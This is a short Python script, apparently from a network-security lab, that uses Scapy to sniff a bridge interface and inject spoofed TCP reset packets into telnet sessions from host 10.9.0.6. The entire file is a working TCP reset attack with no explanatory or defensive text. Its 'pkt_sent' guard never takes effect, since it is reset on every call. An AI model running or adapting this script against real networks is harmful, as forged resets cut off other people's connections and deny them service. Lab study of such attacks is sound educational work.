#!/bin/env python3

import sys
from scapy.all import *

print("SENDING RESET PACKET......")

def rstauto(pkt):
  pkt_sent = False
  if pkt.haslayer(IP) and pkt[IP].src == "10.9.0.6" and pkt.dport == 23 and pkt_sent == False:
    ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
    tcp = TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, flags="R", seq=pkt[TCP].ack, ack=pkt[TCP].seq)
    new_pkt = ip/tcp
    ls(new_pkt)
    send(new_pkt,iface="br-e10c82fffb7c",verbose=0)
    pkt_sent = True
   
sniff(iface="br-e10c82fffb7c",prn=rstauto)


